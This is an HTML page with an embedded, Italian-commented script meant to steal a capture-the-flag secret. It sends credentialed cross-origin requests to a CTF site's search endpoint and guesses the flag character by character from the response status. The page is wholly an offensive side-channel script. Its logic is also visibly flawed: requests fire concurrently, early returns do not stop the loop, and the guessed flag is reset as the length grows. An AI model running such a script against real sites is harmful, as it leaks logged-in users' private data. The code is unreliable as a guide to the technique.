<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <div id="results"></div>

    <script>
        const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
        const maxFlagLength = 40; // Lunghezza massima da testare
        let currentFlag = '';
        let currentLength = 1; // Inizia dalla lunghezza 1

        // Funzione per testare i caratteri della flag
        const testChar = (position) => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare

            if (position >= currentLength) {
                // Se abbiamo testato tutti i caratteri per la lunghezza corrente
                if (currentLength < maxFlagLength) {
                    currentLength++;
                    currentFlag = ''; // Resettiamo currentFlag per la nuova lunghezza
                    console.log(`Passando alla lunghezza ${currentLength}`);
                    testChar(0); // Iniziamo il test per la nuova lunghezza
                } else {
                    document.getElementById('results').innerText += `Flag completa: ${currentFlag}\n`;
                    return; // Termina il processo
                }
                return;
            }

            for (let char of chars) {
                const query = `${baseUrl}${currentFlag}${char}`; // Aggiungi il carattere alla query
                fetch(query, {
                    method: 'GET',
                    credentials: 'include', // Include i cookie di sessione
                    mode: 'cors' // Imposta CORS
                })
                .then(response => {
                    if (response.ok) {
                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
                        currentFlag += char; // Aggiungi il carattere trovato
                        document.getElementById('results').innerText += `Trovato: ${currentFlag}\n`;
                        testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
                        return; // Interrompe il ciclo se trova un carattere valido
                    } else if (response.status === 404) {
                        // Se riceviamo un 404 per l'ultimo carattere testato
                        console.log(`Carattere ${char} non valido per la posizione ${position}, la flag potrebbe essere: ${currentFlag}`);
                        // Considera la flag completa e termina
                        document.getElementById('results').innerText += `Flag conclusa: ${currentFlag}\n`;
                        return; // Termina il processo
                    } else {
                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
                    }
                })
                .catch(error => console.error('Errore:', error));
            }
        };

        // Inizia il processo di test dei caratteri
        testChar(0);
    </script>
</body>
</html>
